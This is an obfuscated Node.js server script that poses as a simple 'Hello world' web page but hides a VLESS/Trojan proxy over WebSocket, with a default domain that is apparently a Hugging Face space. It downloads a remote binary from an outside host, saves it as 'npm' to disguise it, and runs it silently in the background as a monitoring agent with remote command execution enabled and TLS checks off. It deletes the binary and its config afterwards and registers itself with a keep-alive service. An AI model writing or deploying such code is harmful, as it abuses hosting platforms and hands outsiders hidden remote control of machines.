const _0x259f30=_0x3392;(function(_0x2afd1d,_0x61011f){const _0x5b96dd=_0x3392,_0x2287fb=_0x2afd1d();while(!![]){try{const _0x2c8e43=-parseInt(_0x5b96dd(0x1fe))/0x1*(-parseInt(_0x5b96dd(0x20c))/0x2)+-parseInt(_0x5b96dd(0x230))/0x3*(parseInt(_0x5b96dd(0x1e5))/0x4)+parseInt(_0x5b96dd(0x1ff))/0x5*(-parseInt(_0x5b96dd(0x1e0))/0x6)+-parseInt(_0x5b96dd(0x1e9))/0x7*(parseInt(_0x5b96dd(0x245))/0x8)+parseInt(_0x5b96dd(0x20e))/0x9+parseInt(_0x5b96dd(0x1f6))/0xa*(-parseInt(_0x5b96dd(0x250))/0xb)+-parseInt(_0x5b96dd(0x1f0))/0xc*(-parseInt(_0x5b96dd(0x221))/0xd);if(_0x2c8e43===_0x61011f)break;else _0x2287fb['push'](_0x2287fb['shift']());}catch(_0xdead66){_0x2287fb['push'](_0x2287fb['shift']());}}}(_0x2ce4,0xf1848));const os=require('os'),http=require(_0x259f30(0x202)),fs=require('fs'),axios=require(_0x259f30(0x1fa)),net=require(_0x259f30(0x241)),path=require('path'),crypto=require(_0x259f30(0x246)),{Buffer}=require(_0x259f30(0x20b)),{exec,execSync}=require(_0x259f30(0x22c)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x259f30(0x1f9)]['UUID']||'df8bb769-ba01-455a-833b-c80dd61d2683',NEZHA_SERVER=process[_0x259f30(0x1f9)][_0x259f30(0x1dd)]||'',NEZHA_PORT=process[_0x259f30(0x1f9)][_0x259f30(0x21d)]||'',NEZHA_KEY=process[_0x259f30(0x1f9)][_0x259f30(0x24e)]||'',DOMAIN=process['env']['DOMAIN']||_0x259f30(0x224),AUTO_ACCESS=process[_0x259f30(0x1f9)][_0x259f30(0x219)]||!![],WSPATH=process[_0x259f30(0x1f9)]['WSPATH']||UUID[_0x259f30(0x222)](0x0,0x8),SUB_PATH=process[_0x259f30(0x1f9)]['SUB_PATH']||'sub',NAME=process[_0x259f30(0x1f9)]['NAME']||_0x259f30(0x1fc),PORT=process[_0x259f30(0x1f9)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0xa68ebb=_0x259f30;try{const _0x2c8083=await axios[_0xa68ebb(0x1f3)](_0xa68ebb(0x1df)),_0x5ea0af=_0x2c8083[_0xa68ebb(0x23a)];ISP=(_0x5ea0af[_0xa68ebb(0x1d9)]+'-'+_0x5ea0af[_0xa68ebb(0x218)])[_0xa68ebb(0x212)](/ /g,'_');}catch(_0x262565){ISP=_0xa68ebb(0x225);}};function _0x2ce4(){const _0x4c1085=['replace','application/dns-json','config.yaml','finish','Answer','send','asOrganization','AUTO_ACCESS','every','https://dns.google/resolve?name=','/bin/bash','NEZHA_PORT','length','writeHead','2096','2639ViEGJN','slice','hex','3www-1.hf.space','Unknown','443','\x20-p\x20','substr','text/html','npm\x20download\x20successfully','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','child_process','aarch64','trim','listen','3HVZgCP','utf-8','Server','decode','from','concat','2053','writeFileSync','pop','test','data','https://amd64.ssss.nyc.mn/v1','pipe','--tls','application/json','write','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','net','includes','close','base64','24EvkBNI','crypto','Status','readUInt16BE','https://amd64.ssss.nyc.mn/agent','arch','arm','true','once','NEZHA_KEY','https://arm64.ssss.nyc.mn/agent','22jUmSNM','readFile','trojan://','connection','&path=%2F','&fp=chrome&type=ws&host=','map','country','2087','https://oooo.serv00.net/add-url','url','NEZHA_SERVER','Automatic\x20Access\x20Task\x20added\x20successfully','https://speed.cloudflare.com/meta','13050louPco','createWriteStream','end','vless://','unlink','6075116DODsQS','Hello\x20world!','catch','client_secret:\x20','4380313PTOKxH','log','&type=A','post','digest','Not\x20Found\x0a','npm','356628FPLzWt',':443?encryption=none&security=tls&sni=','reduce','get','then','type','6406750zQbbTy','false','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','env','axios','join','Hug','error','79859LNayJw','2625GMzaSf','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','toString','http','setsid\x20nohup\x20./npm\x20-s\x20',':443?security=tls&sni=','2083','npm\x20is\x20running','stream','update','readUInt8','text/plain','buffer','6aBeCwe','8.8.4.4','4824027OYpzlp','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','1.1.1.1','connect'];_0x2ce4=function(){return _0x4c1085;};return _0x2ce4();}GetISP();function _0x3392(_0x131599,_0xfd7f05){const _0x2ce412=_0x2ce4();return _0x3392=function(_0x339209,_0x34d0b7){_0x339209=_0x339209-0x1d7;let _0xbf6502=_0x2ce412[_0x339209];return _0xbf6502;},_0x3392(_0x131599,_0xfd7f05);}const httpServer=http['createServer']((_0x409fce,_0xe8c458)=>{const _0x41922e=_0x259f30;if(_0x409fce[_0x41922e(0x1dc)]==='/'){const _0x3a0041=path['join'](__dirname,'index.html');fs[_0x41922e(0x251)](_0x3a0041,'utf8',(_0x1bf99d,_0x1942c2)=>{const _0x26efa5=_0x41922e;if(_0x1bf99d){_0xe8c458[_0x26efa5(0x21f)](0xc8,{'Content-Type':_0x26efa5(0x229)}),_0xe8c458[_0x26efa5(0x1e2)](_0x26efa5(0x1e6));return;}_0xe8c458['writeHead'](0xc8,{'Content-Type':_0x26efa5(0x229)}),_0xe8c458[_0x26efa5(0x1e2)](_0x1942c2);});return;}else{if(_0x409fce['url']==='/'+SUB_PATH){const _0x1c1b70=_0x41922e(0x1e3)+UUID+'@'+DOMAIN+_0x41922e(0x1f1)+DOMAIN+_0x41922e(0x1d7)+DOMAIN+_0x41922e(0x254)+WSPATH+'#'+NAME+'-'+ISP,_0x47e399=_0x41922e(0x252)+UUID+'@'+DOMAIN+_0x41922e(0x204)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x315117=_0x1c1b70+'\x0a'+_0x47e399,_0x2ad671=Buffer[_0x41922e(0x234)](_0x315117)[_0x41922e(0x201)](_0x41922e(0x244));_0xe8c458[_0x41922e(0x21f)](0xc8,{'Content-Type':'text/plain'}),_0xe8c458[_0x41922e(0x1e2)](_0x2ad671+'\x0a');}else _0xe8c458[_0x41922e(0x21f)](0x194,{'Content-Type':_0x41922e(0x20a)}),_0xe8c458[_0x41922e(0x1e2)](_0x41922e(0x1ee));}}),wss=new WebSocket[(_0x259f30(0x232))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x259f30(0x20d),_0x259f30(0x210)];function resolveHost(_0x724dd2){return new Promise((_0x235001,_0x3316d6)=>{const _0x3cefae=_0x3392;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3cefae(0x239)](_0x724dd2)){_0x235001(_0x724dd2);return;}let _0x1f7f13=0x0;function _0x1d7d23(){const _0x5cd84d=_0x3cefae;if(_0x1f7f13>=DNS_SERVERS[_0x5cd84d(0x21e)]){_0x3316d6(new Error('Failed\x20to\x20resolve\x20'+_0x724dd2+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x2f8afb=DNS_SERVERS[_0x1f7f13];_0x1f7f13++;const _0x3e170e=_0x5cd84d(0x21b)+encodeURIComponent(_0x724dd2)+_0x5cd84d(0x1eb);axios[_0x5cd84d(0x1f3)](_0x3e170e,{'timeout':0x1388,'headers':{'Accept':_0x5cd84d(0x213)}})['then'](_0x1a5b0d=>{const _0x417486=_0x5cd84d,_0x451e2a=_0x1a5b0d[_0x417486(0x23a)];if(_0x451e2a[_0x417486(0x247)]===0x0&&_0x451e2a[_0x417486(0x216)]&&_0x451e2a[_0x417486(0x216)][_0x417486(0x21e)]>0x0){const _0x414f99=_0x451e2a[_0x417486(0x216)]['find'](_0x1bcafe=>_0x1bcafe[_0x417486(0x1f5)]===0x1);if(_0x414f99){_0x235001(_0x414f99[_0x417486(0x23a)]);return;}}_0x1d7d23();})['catch'](_0x638f33=>{_0x1d7d23();});}_0x1d7d23();});}function handleVlessConnection(_0x25f879,_0x45d217){const _0x29b599=_0x259f30,[_0x1174f9]=_0x45d217,_0x5181cc=_0x45d217[_0x29b599(0x222)](0x1,0x11);if(!_0x5181cc[_0x29b599(0x21a)]((_0x9873b8,_0x48d0e6)=>_0x9873b8==parseInt(uuid['substr'](_0x48d0e6*0x2,0x2),0x10)))return![];let _0x476430=_0x45d217[_0x29b599(0x222)](0x11,0x12)[_0x29b599(0x209)]()+0x13;const _0x1e12ae=_0x45d217[_0x29b599(0x222)](_0x476430,_0x476430+=0x2)[_0x29b599(0x248)](0x0),_0x316e55=_0x45d217[_0x29b599(0x222)](_0x476430,_0x476430+=0x1)[_0x29b599(0x209)](),_0x25e5db=_0x316e55==0x1?_0x45d217[_0x29b599(0x222)](_0x476430,_0x476430+=0x4)[_0x29b599(0x1fb)]('.'):_0x316e55==0x2?new TextDecoder()[_0x29b599(0x233)](_0x45d217[_0x29b599(0x222)](_0x476430+0x1,_0x476430+=0x1+_0x45d217['slice'](_0x476430,_0x476430+0x1)['readUInt8']())):_0x316e55==0x3?_0x45d217[_0x29b599(0x222)](_0x476430,_0x476430+=0x10)['reduce']((_0x1a565e,_0x155fa3,_0x52d340,_0x50ee7d)=>_0x52d340%0x2?_0x1a565e[_0x29b599(0x235)](_0x50ee7d['slice'](_0x52d340-0x1,_0x52d340+0x1)):_0x1a565e,[])[_0x29b599(0x1d8)](_0x26d257=>_0x26d257[_0x29b599(0x248)](0x0)[_0x29b599(0x201)](0x10))[_0x29b599(0x1fb)](':'):'';_0x25f879[_0x29b599(0x217)](new Uint8Array([_0x1174f9,0x0]));const _0x14205b=createWebSocketStream(_0x25f879);return resolveHost(_0x25e5db)[_0x29b599(0x1f4)](_0x534396=>{const _0x515d24=_0x29b599;net[_0x515d24(0x211)]({'host':_0x534396,'port':_0x1e12ae},function(){const _0x19c471=_0x515d24;this[_0x19c471(0x23f)](_0x45d217[_0x19c471(0x222)](_0x476430)),_0x14205b['on']('error',()=>{})[_0x19c471(0x23c)](this)['on'](_0x19c471(0x1fd),()=>{})[_0x19c471(0x23c)](_0x14205b);})['on'](_0x515d24(0x1fd),()=>{});})[_0x29b599(0x1e7)](_0x1d9b6b=>{const _0x52d1b2=_0x29b599;net[_0x52d1b2(0x211)]({'host':_0x25e5db,'port':_0x1e12ae},function(){const _0x15c7f3=_0x52d1b2;this[_0x15c7f3(0x23f)](_0x45d217[_0x15c7f3(0x222)](_0x476430)),_0x14205b['on'](_0x15c7f3(0x1fd),()=>{})[_0x15c7f3(0x23c)](this)['on']('error',()=>{})[_0x15c7f3(0x23c)](_0x14205b);})['on'](_0x52d1b2(0x1fd),()=>{});}),!![];}function handleTrojanConnection(_0x10a481,_0x3a00e9){const _0x52b67b=_0x259f30;try{if(_0x3a00e9[_0x52b67b(0x21e)]<0x3a)return![];const _0x165d5c=_0x3a00e9[_0x52b67b(0x222)](0x0,0x38)['toString'](),_0x2165a3=[UUID];let _0x5cad35=null;for(const _0x5bf23b of _0x2165a3){const _0x441bf0=crypto['createHash']('sha224')[_0x52b67b(0x208)](_0x5bf23b)[_0x52b67b(0x1ed)](_0x52b67b(0x223));if(_0x441bf0===_0x165d5c){_0x5cad35=_0x5bf23b;break;}}if(!_0x5cad35)return![];let _0x1284ba=0x38;_0x3a00e9[_0x1284ba]===0xd&&_0x3a00e9[_0x1284ba+0x1]===0xa&&(_0x1284ba+=0x2);const _0x3dac40=_0x3a00e9[_0x1284ba];if(_0x3dac40!==0x1)return![];_0x1284ba+=0x1;const _0x4fba8e=_0x3a00e9[_0x1284ba];_0x1284ba+=0x1;let _0x2f4f5a,_0x243905;if(_0x4fba8e===0x1)_0x2f4f5a=_0x3a00e9['slice'](_0x1284ba,_0x1284ba+0x4)[_0x52b67b(0x1fb)]('.'),_0x1284ba+=0x4;else{if(_0x4fba8e===0x3){const _0x5b8607=_0x3a00e9[_0x1284ba];_0x1284ba+=0x1,_0x2f4f5a=_0x3a00e9[_0x52b67b(0x222)](_0x1284ba,_0x1284ba+_0x5b8607)[_0x52b67b(0x201)](),_0x1284ba+=_0x5b8607;}else{if(_0x4fba8e===0x4)_0x2f4f5a=_0x3a00e9[_0x52b67b(0x222)](_0x1284ba,_0x1284ba+0x10)[_0x52b67b(0x1f2)]((_0x5eb091,_0x40bf02,_0xbfe321,_0x35c651)=>_0xbfe321%0x2?_0x5eb091[_0x52b67b(0x235)](_0x35c651[_0x52b67b(0x222)](_0xbfe321-0x1,_0xbfe321+0x1)):_0x5eb091,[])[_0x52b67b(0x1d8)](_0x27e7a5=>_0x27e7a5[_0x52b67b(0x248)](0x0)[_0x52b67b(0x201)](0x10))[_0x52b67b(0x1fb)](':'),_0x1284ba+=0x10;else return![];}}_0x243905=_0x3a00e9['readUInt16BE'](_0x1284ba),_0x1284ba+=0x2;_0x1284ba<_0x3a00e9[_0x52b67b(0x21e)]&&_0x3a00e9[_0x1284ba]===0xd&&_0x3a00e9[_0x1284ba+0x1]===0xa&&(_0x1284ba+=0x2);const _0xb8c591=createWebSocketStream(_0x10a481);return resolveHost(_0x2f4f5a)['then'](_0x301349=>{const _0x50b450=_0x52b67b;net[_0x50b450(0x211)]({'host':_0x301349,'port':_0x243905},function(){const _0x426da5=_0x50b450;_0x1284ba<_0x3a00e9[_0x426da5(0x21e)]&&this['write'](_0x3a00e9[_0x426da5(0x222)](_0x1284ba)),_0xb8c591['on']('error',()=>{})[_0x426da5(0x23c)](this)['on'](_0x426da5(0x1fd),()=>{})[_0x426da5(0x23c)](_0xb8c591);})['on'](_0x50b450(0x1fd),()=>{});})[_0x52b67b(0x1e7)](_0x176981=>{const _0x2d4e68=_0x52b67b;net[_0x2d4e68(0x211)]({'host':_0x2f4f5a,'port':_0x243905},function(){const _0x20c0cf=_0x2d4e68;_0x1284ba<_0x3a00e9[_0x20c0cf(0x21e)]&&this['write'](_0x3a00e9['slice'](_0x1284ba)),_0xb8c591['on']('error',()=>{})['pipe'](this)['on'](_0x20c0cf(0x1fd),()=>{})[_0x20c0cf(0x23c)](_0xb8c591);})['on'](_0x2d4e68(0x1fd),()=>{});}),!![];}catch(_0x2c4007){return![];}}wss['on'](_0x259f30(0x253),(_0x5c78f0,_0x103788)=>{const _0x4a5c44=_0x259f30,_0x2d8c00=_0x103788[_0x4a5c44(0x1dc)]||'';_0x5c78f0[_0x4a5c44(0x24d)]('message',_0x187405=>{const _0x17ba7c=_0x4a5c44;if(_0x187405[_0x17ba7c(0x21e)]>0x11&&_0x187405[0x0]===0x0){const _0x458f28=_0x187405[_0x17ba7c(0x222)](0x1,0x11),_0x3a2a29=_0x458f28[_0x17ba7c(0x21a)]((_0x25c39b,_0x2e5695)=>_0x25c39b==parseInt(uuid[_0x17ba7c(0x228)](_0x2e5695*0x2,0x2),0x10));if(_0x3a2a29){!handleVlessConnection(_0x5c78f0,_0x187405)&&_0x5c78f0[_0x17ba7c(0x243)]();return;}}!handleTrojanConnection(_0x5c78f0,_0x187405)&&_0x5c78f0[_0x17ba7c(0x243)]();})['on'](_0x4a5c44(0x1fd),()=>{});});const getDownloadUrl=()=>{const _0x5c4d52=_0x259f30,_0x9fbc35=os[_0x5c4d52(0x24a)]();return _0x9fbc35===_0x5c4d52(0x24b)||_0x9fbc35==='arm64'||_0x9fbc35===_0x5c4d52(0x22d)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x5c4d52(0x24f):!NEZHA_PORT?_0x5c4d52(0x23b):_0x5c4d52(0x249);},downloadFile=async()=>{const _0x27a80f=_0x259f30;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1f01c1=getDownloadUrl(),_0xc2a279=await axios({'method':_0x27a80f(0x1f3),'url':_0x1f01c1,'responseType':_0x27a80f(0x207)}),_0x38067c=fs[_0x27a80f(0x1e1)](_0x27a80f(0x1ef));return _0xc2a279['data'][_0x27a80f(0x23c)](_0x38067c),new Promise((_0x17e541,_0x319938)=>{const _0x318016=_0x27a80f;_0x38067c['on'](_0x318016(0x215),()=>{const _0x879931=_0x318016;console[_0x879931(0x1ea)](_0x879931(0x22a)),exec('chmod\x20+x\x20npm',_0x108c23=>{if(_0x108c23)_0x319938(_0x108c23);_0x17e541();});}),_0x38067c['on']('error',_0x319938);});}catch(_0x11fbca){throw _0x11fbca;}},runnz=async()=>{const _0x2c9edd=_0x259f30;try{const _0x5d8bc1=execSync(_0x2c9edd(0x22b),{'encoding':_0x2c9edd(0x231)});if(_0x5d8bc1[_0x2c9edd(0x22e)]()!==''){console[_0x2c9edd(0x1ea)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x49c82e){}await downloadFile();let _0x1849bf='',_0x5f1625=[_0x2c9edd(0x226),'8443',_0x2c9edd(0x220),_0x2c9edd(0x1da),_0x2c9edd(0x205),_0x2c9edd(0x236)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1a651a=_0x5f1625[_0x2c9edd(0x242)](NEZHA_PORT)?_0x2c9edd(0x23d):'';_0x1849bf=_0x2c9edd(0x203)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2c9edd(0x227)+NEZHA_KEY+'\x20'+_0x1a651a+_0x2c9edd(0x240);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5e298a=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x2c9edd(0x238)]():'',_0xa83509=_0x5f1625[_0x2c9edd(0x242)](_0x5e298a)?_0x2c9edd(0x24c):_0x2c9edd(0x1f7),_0x3f6ef0=_0x2c9edd(0x1e8)+NEZHA_KEY+_0x2c9edd(0x1f8)+NEZHA_SERVER+_0x2c9edd(0x20f)+_0xa83509+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x2c9edd(0x237)](_0x2c9edd(0x214),_0x3f6ef0);}_0x1849bf='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x2c9edd(0x1ea)](_0x2c9edd(0x200));return;}}try{exec(_0x1849bf,{'shell':_0x2c9edd(0x21c)},_0x26ebd3=>{const _0x4dbb60=_0x2c9edd;if(_0x26ebd3)console[_0x4dbb60(0x1fd)]('npm\x20running\x20error:',_0x26ebd3);else console[_0x4dbb60(0x1ea)](_0x4dbb60(0x206));});}catch(_0x4441bb){console[_0x2c9edd(0x1fd)]('error:\x20'+_0x4441bb);}};async function addAccessTask(){const _0xc655fb=_0x259f30;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2b2ad3='https://'+DOMAIN;try{const _0x38904c=await axios[_0xc655fb(0x1ec)](_0xc655fb(0x1db),{'url':_0x2b2ad3},{'headers':{'Content-Type':_0xc655fb(0x23e)}});console[_0xc655fb(0x1ea)](_0xc655fb(0x1de));}catch(_0x1de13c){}}const delFiles=()=>{const _0x43858e=_0x259f30;fs[_0x43858e(0x1e4)](_0x43858e(0x1ef),()=>{}),fs['unlink'](_0x43858e(0x214),()=>{});};httpServer[_0x259f30(0x22f)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
